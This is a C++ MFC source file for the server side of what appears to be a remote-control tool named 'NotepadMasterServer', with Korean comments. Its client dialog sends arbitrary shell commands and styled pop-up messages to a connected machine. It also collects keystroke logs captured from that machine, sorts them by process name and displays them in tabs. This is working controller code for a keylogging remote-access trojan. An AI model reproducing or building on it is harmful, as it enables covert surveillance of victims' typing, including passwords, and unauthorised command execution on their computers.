// CClient.cpp: 구현 파일
//

#include "pch.h"
#include "NotepadMasterServer.h"
#include "CClient.h"
#include "CClientKeylog.h"
#include "afxdialogex.h"

#include "definition.h"

// CClient 대화 상자

IMPLEMENT_DYNAMIC(CClient, CDialogEx)

CClient::CClient(CWnd* pParent /*=nullptr*/)
	: CDialogEx(IDD_DIALOG_CLIENT, pParent)
	, m_msg_kind(0)
	, m_command(_T(""))
	, m_edit_font_size(0)
	, m_check_font_italics(FALSE)
	, m_check_font_bold(FALSE)
	, m_check_font_underlined(FALSE)
	, m_check_font_strike(FALSE)
	, m_edit_command_delay(NORMAL_COMMAND_DELAY)
{
	memset(m_font.lfFaceName, 0, 31 * sizeof(WCHAR));
}

CClient::~CClient()
{
}

void CClient::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Radio(pDX, IDC_RADIO_MSG_KIND1, m_msg_kind);
	DDX_Text(pDX, IDC_EDIT_COMMAND, m_command);
	DDX_Control(pDX, IDC_TAB_CLIENT_KEYLOG, m_tab_client_keylog);
	DDX_Control(pDX, IDC_COMBO_FONT, m_combo_font);
	DDX_Text(pDX, IDC_EDIT_FONT_SIZE, m_edit_font_size);
	DDX_Control(pDX, IDC_SPIN_FONT_SIZE, m_spin_font_size);
	DDX_Check(pDX, IDC_CHECK_FONT_ITALICS, m_check_font_italics);
	DDX_Check(pDX, IDC_CHECK_FONT_BOLD, m_check_font_bold);
	DDX_Check(pDX, IDC_CHECK_FONT_UNDERLINED, m_check_font_underlined);
	DDX_Check(pDX, IDC_CHECK_FONT_STRIKE, m_check_font_strike);
	DDX_Text(pDX, IDC_EDIT_COMMAND_DELAY, m_edit_command_delay);
}


BEGIN_MESSAGE_MAP(CClient, CDialogEx)
	ON_WM_CLOSE()
	ON_BN_CLICKED(IDC_BUTTON_SEND, &CClient::OnBnClickedButtonSend)
	ON_NOTIFY(TCN_SELCHANGE, IDC_TAB_CLIENT_KEYLOG, &CClient::OnSelchangeTabClientKeylog)
	ON_CBN_SELCHANGE(IDC_COMBO_FONT, &CClient::OnSelchangeComboFont)
	ON_EN_CHANGE(IDC_EDIT_FONT_SIZE, &CClient::OnChangeEditFontSize)
	ON_NOTIFY(UDN_DELTAPOS, IDC_SPIN_FONT_SIZE, &CClient::OnDeltaposSpinFontSize)
	ON_BN_CLICKED(IDC_CHECK_FONT_BOLD, &CClient::OnBnClickedCheckFontBold)
	ON_BN_CLICKED(IDC_CHECK_FONT_ITALICS, &CClient::OnBnClickedCheckFontItalics)
	ON_CONTROL_RANGE(BN_CLICKED, IDC_RADIO_MSG_KIND1, IDC_RADIO_MSG_KIND2, &CClient::OnClickedRadioMsgKind)
	ON_BN_CLICKED(IDC_CHECK_FONT_UNDERLINED, &CClient::OnBnClickedCheckUnderlined)
	ON_BN_CLICKED(IDC_CHECK_FONT_STRIKE, &CClient::OnBnClickedCheckFontStrike)
	ON_NOTIFY(UDN_DELTAPOS, IDC_SPIN_COMMAND_DELAY, &CClient::OnDeltaposSpinCommandDelay)
END_MESSAGE_MAP()


// CClient 메시지 처리기

BOOL CClient::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// TODO:  여기에 추가 초기화 작업을 추가합니다.

	// 처음으로 창이 띄워지는 경우에는 LOGFONT 초기화
	if (!wcscmp(m_font.lfFaceName, L""))
	{
		GetFont()->GetLogFont(&m_font);
		m_edit_font_size = m_font.lfHeight = NORMAL_FONT_SIZE;
		wcscpy_s(m_font.lfFaceName, L"맑은 고딕");
	}

	// 폰트 선택창에 폰트 등록
	const WCHAR* font[] = {
		L"굴림", L"굴림체", L"궁서", L"궁서체", L"나눔고딕", L"돋움", L"돋움체", L"맑은 고딕",
		L"바탕", L"새굴림", L"휴먼둥근헤드라인", L"휴먼매직체", L"휴먼모음T", NULL
	};

	for (int i = 0; font[i] != NULL; i++)
		m_combo_font.AddString(font[i]);

	int index;
	for (index = 0;; index++) // 콤보 박스에서 선택된 폰트의 인덱스를 조회
	{
		CString lb_text;
		m_combo_font.GetLBText(index, lb_text);
		if (!wcscmp(lb_text, m_font.lfFaceName))
			break;
	}

	// 폰트 콤보 박스를 구한 인덱스로 설정
	m_combo_font.SetCurSel(index);
	UpdateData(FALSE);

	UpdateFont();

	if (m_keylogs.size()) // 키로그를 하나라도 전송받았다면
	{
		for (int i = 0; i < m_keylogs.size(); i++) // 모든 프로세스의 탭 컨트롤 생성
			UpdateKeylog(i);

		m_keylogs[0]->ShowWindow(SW_SHOW);
	}


	return TRUE;  // return TRUE unless you set the focus to a control
				  // 예외: OCX 속성 페이지는 FALSE를 반환해야 합니다.
}

void CClient::OnClose()
{
	// TODO: 여기에 메시지 처리기 코드를 추가 및/또는 기본값을 호출합니다.
	DestroyWindow();
	CDialogEx::OnClose();
}


void CClient::OnBnClickedButtonSend()
{
	// TODO: 여기에 컨트롤 알림 처리기 코드를 추가합니다.

	CheckEditsEmpty();
	UpdateData(TRUE);

	m_command.Replace(L"\r\n", L"\n");

	PDUMessage pdu_message;
	PDUCommand pdu_command;
	switch (m_msg_kind)
	{
	case 0:
		UpdateFont(); // 메시지 입력창에 폰트 업뎃

		wcscpy_s(pdu_message.message, m_command.GetBuffer());
		pdu_message.protocol_type = MESSAGE;
		pdu_message.delay = m_edit_command_delay;
		memcpy(&pdu_message.font, &m_font, sizeof(LOGFONT));
		socket->Send(&pdu_message, sizeof(PDUMessage) - 600 * sizeof(WCHAR) + m_command.GetLength() * 2 + 1); // size of PDUMessage - member message(unicode len * 2) + command(unicode len * 2)
		break;

	case 1 :
		wcscpy_s(pdu_command.command, m_command.GetBuffer());
		pdu_command.protocol_type = COMMAND;
		socket->Send(&pdu_command, 1 + m_command.GetLength() * 2 + 1); // protocol_type(1byte) + command(unicode len * 2)
		break;
	}
}

// 클라이언트가 보낸 키로그를 받았을때(CClientSocket -> main dialog -> CClient)
void CClient::ReceiveKeylog(PDUKeylog* pdu)
{
	// TODO: 여기에 구현 코드 추가.
	UINT i;

	// 프로세스 리스트를 순환하며 일치하는 프로세스 인덱스를 찾음
	for (i = 0; i < m_keylogs.size(); i++)
	{
		if (!wcscmp(pdu->process_name, m_keylogs[i]->GetProcessName()))
			break;
	}
	if (i == m_keylogs.size()) // 처음 보는 프로세스일때
	{
		// 프로세스 리스트에 추가
		m_keylogs.push_back(new CClientKeylog(pdu->process_name));
	}

	m_keylogs[i]->ScanKeylog(pdu); // 내부에 키로그 데이터 저장

	if (!m_hWnd) // 창이 안띄워져 있을땐 업데이트x
		return;

	UpdateKeylog(i);
	
}

/* 특정 프로세스의 키로그 출력창을 업데이트 */
void CClient::UpdateKeylog(UINT index)
{
	// TODO: 여기에 구현 코드 추가.

	// 키로그 출력창 윈도우가 생성되어있지 않으면
	if (!m_keylogs[index]->m_hWnd)
	{
		m_tab_client_keylog.InsertItem(index, m_keylogs[index]->GetProcessName()); // 탭 메뉴를 만듬
		m_keylogs[index]->Create(IDD_DIALOG_CLIENT_KEYLOG, &m_tab_client_keylog); // 출력창을 탭 메뉴 안에 생성함

		// 탭 위치, 크기, 보이기 등 설정
		CRect size;
		m_tab_client_keylog.GetWindowRect(&size);
		m_keylogs[index]->MoveWindow(0, 20, size.Width(), size.Height());
		m_keylogs[index]->ShowWindow(SW_HIDE);

		m_keylogs[m_tab_client_keylog.GetCurSel()]->ShowWindow(SW_HIDE);
		m_keylogs[m_tab_client_keylog.GetCurSel()]->ShowWindow(SW_SHOW);
	}
	m_keylogs[index]->PrintKeylog(); // 데이터 출력까지
}


void CClient::OnSelchangeTabClientKeylog(NMHDR *pNMHDR, LRESULT *pResult)
{
	// TODO: 여기에 컨트롤 알림 처리기 코드를 추가합니다.
	for (int i = 0; i < m_tab_client_keylog.GetItemCount(); i++)
		m_keylogs[i]->ShowWindow(SW_HIDE);

	m_keylogs[m_tab_client_keylog.GetCurSel()]->ShowWindow(SW_SHOW);

	*pResult = 0;
}


// 메시지 입력창에 폰트 업데이트
void CClient::UpdateFont()
{
	// TODO: 여기에 구현 코드 추가.
	CString font_name;
	int sel = m_combo_font.GetCurSel();
	if (sel >= 0) {
		m_combo_font.GetLBText(sel, font_name);
		wcscpy_s(m_font.lfFaceName, font_name);
	}
	m_font.lfHeight = m_edit_font_size;

	if (m_check_font_bold)
		m_font.lfWeight = FW_BOLD;
	else
		m_font.lfWeight = FW_NORMAL;

	m_font.lfItalic = m_check_font_italics;
	m_font.lfUnderline = m_check_font_underlined;
	m_font.lfStrikeOut = m_check_font_strike;

	CFont font;
	font.CreateFontIndirectW(&m_font);
	GetDlgItem(IDC_EDIT_COMMAND)->SetFont(&font);
}

void CClient::OnSelchangeComboFont()
{
	// TODO: 여기에 컨트롤 알림 처리기 코드를 추가합니다.
	UpdateFont();
}

// 폰트 크기를 키보드로 입력 할 때
void CClient::OnChangeEditFontSize()
{
	// TODO:  RICHEDIT 컨트롤인 경우, 이 컨트롤은
	// CDialogEx::OnInitDialog() 함수를 재지정 
	//하고 마스크에 OR 연산하여 설정된 ENM_CHANGE 플래그를 지정하여 CRichEditCtrl().SetEventMask()를 호출하지 않으면
	// 이 알림 메시지를 보내지 않습니다.

	// TODO:  여기에 컨트롤 알림 처리기 코드를 추가합니다.

	// 입력 칸이 비어있으면
	CString str;
	GetDlgItem(IDC_EDIT_FONT_SIZE)->GetWindowTextW(str);
	if (str == L"")
		return; // UpdateData(TRUE)를 하면 안됨

	CheckEditsEmpty();
	UpdateData(TRUE);
	UpdateFont();
}

// 폰트 크기 올리기, 내리기 이벤트
void CClient::OnDeltaposSpinFontSize(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMUPDOWN pNMUpDown = reinterpret_cast<LPNMUPDOWN>(pNMHDR);
	// TODO: 여기에 컨트롤 알림 처리기 코드를 추가합니다.
	*pResult = 0;

	CheckEditsEmpty();
	UpdateData(TRUE);

	if (pNMUpDown->iDelta < 0) // Up
		m_edit_font_size++;
	else // Down
		if(m_edit_font_size > 0) // Down은 양수 일 때만
			m_edit_font_size--;

	UpdateData(FALSE);
	UpdateFont();
}

// 폰트 옵션 : 굵게
void CClient::OnBnClickedCheckFontBold()
{
	// TODO: 여기에 컨트롤 알림 처리기 코드를 추가합니다.
	CheckEditsEmpty();
	UpdateData(TRUE);
	UpdateFont();
}

// 폰트 옵션 : 기울임꼴
void CClient::OnBnClickedCheckFontItalics()
{
	// TODO: 여기에 컨트롤 알림 처리기 코드를 추가합니다.
	CheckEditsEmpty();
	UpdateData(TRUE);
	UpdateFont();
}

// 폰트 옵션 : 밑줄
void CClient::OnBnClickedCheckUnderlined()
{
	// TODO: 여기에 컨트롤 알림 처리기 코드를 추가합니다.
	CheckEditsEmpty();
	UpdateData(TRUE);
	UpdateFont();
}

// 폰트 옵션 : 취소선
void CClient::OnBnClickedCheckFontStrike()
{
	// TODO: 여기에 컨트롤 알림 처리기 코드를 추가합니다.
	CheckEditsEmpty();
	UpdateData(TRUE);
	UpdateFont();
}
// 메시지 입력 옵션 : 메시지 <==> CMD
void CClient::OnClickedRadioMsgKind(UINT uid)
{
	// TODO: 여기에 컨트롤 알림 처리기 코드를 추가합니다.

	CheckEditsEmpty();
	UpdateData(TRUE);
	UpdateFont();
	
	switch (m_msg_kind)
	{
	case 1: // COMMAND(cmd) 옵션이면

		// 폰트 관련 윈도우 비활성화
		GetDlgItem(IDC_STATIC_FONT)->EnableWindow(FALSE);
		GetDlgItem(IDC_COMBO_FONT)->EnableWindow(FALSE);
		GetDlgItem(IDC_STATIC_FONT_SIZE)->EnableWindow(FALSE);
		GetDlgItem(IDC_EDIT_FONT_SIZE)->EnableWindow(FALSE);
		GetDlgItem(IDC_SPIN_FONT_SIZE)->EnableWindow(FALSE);
		GetDlgItem(IDC_CHECK_FONT_BOLD)->EnableWindow(FALSE);
		GetDlgItem(IDC_CHECK_FONT_ITALICS)->EnableWindow(FALSE);
		GetDlgItem(IDC_CHECK_FONT_UNDERLINED)->EnableWindow(FALSE);
		GetDlgItem(IDC_CHECK_FONT_STRIKE)->EnableWindow(FALSE);
		GetDlgItem(IDC_STATIC_COMMAND_DELAY)->EnableWindow(FALSE);
		GetDlgItem(IDC_EDIT_COMMAND_DELAY)->EnableWindow(FALSE);
		GetDlgItem(IDC_SPIN_COMMAND_DELAY)->EnableWindow(FALSE);
		GetDlgItem(IDC_EDIT_COMMAND)->SetFont(GetFont()); // 메시지 입력창을 mfc 기본 폰트로 설정
		break;

	default: // 아니면
		GetDlgItem(IDC_STATIC_FONT)->EnableWindow(TRUE);
		GetDlgItem(IDC_COMBO_FONT)->EnableWindow(TRUE);
		GetDlgItem(IDC_STATIC_FONT_SIZE)->EnableWindow(TRUE);
		GetDlgItem(IDC_EDIT_FONT_SIZE)->EnableWindow(TRUE);
		GetDlgItem(IDC_SPIN_FONT_SIZE)->EnableWindow(TRUE);
		GetDlgItem(IDC_CHECK_FONT_BOLD)->EnableWindow(TRUE);
		GetDlgItem(IDC_CHECK_FONT_ITALICS)->EnableWindow(TRUE);
		GetDlgItem(IDC_CHECK_FONT_UNDERLINED)->EnableWindow(TRUE);
		GetDlgItem(IDC_CHECK_FONT_STRIKE)->EnableWindow(TRUE);
		GetDlgItem(IDC_STATIC_COMMAND_DELAY)->EnableWindow(TRUE);
		GetDlgItem(IDC_EDIT_COMMAND_DELAY)->EnableWindow(TRUE);
		GetDlgItem(IDC_SPIN_COMMAND_DELAY)->EnableWindow(TRUE);
		UpdateFont(); // 폰트를 유저가 설정한대로 되돌림
	}
}

// 딜레이 값 올리기, 내리기 이벤트
void CClient::OnDeltaposSpinCommandDelay(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMUPDOWN pNMUpDown = reinterpret_cast<LPNMUPDOWN>(pNMHDR);
	// TODO: 여기에 컨트롤 알림 처리기 코드를 추가합니다.
	*pResult = 0;

	UpdateData(TRUE);

	if (pNMUpDown->iDelta < 0) // Up
		m_edit_command_delay++;
	else // Down
		if (m_edit_command_delay > 0) // Down은 양수 일 때만
			m_edit_command_delay--;

	UpdateData(FALSE);
}

// UpdateData(TRUE)를 하기 전 필수 입력 칸이 비어있는지 검사하고 비어있으면 이전 값으로 초기화 수행
void CClient::CheckEditsEmpty()
{
	// TODO: 여기에 구현 코드 추가.
	UINT resource_id[] = {
		IDC_EDIT_FONT_SIZE, IDC_EDIT_COMMAND_DELAY, NULL
	};
	UINT resource_value[] = {
		m_font.lfHeight, m_edit_command_delay
	};

	CString str;

	for (int i = 0; resource_id[i]; i++)
	{
		GetDlgItem(resource_id[i])->GetWindowTextW(str);
		if (str == L"")
		{
			str.Format(TEXT("%d"), resource_value[i]);
			GetDlgItem(resource_id[i])->SetWindowTextW(str);
		}
	}
}
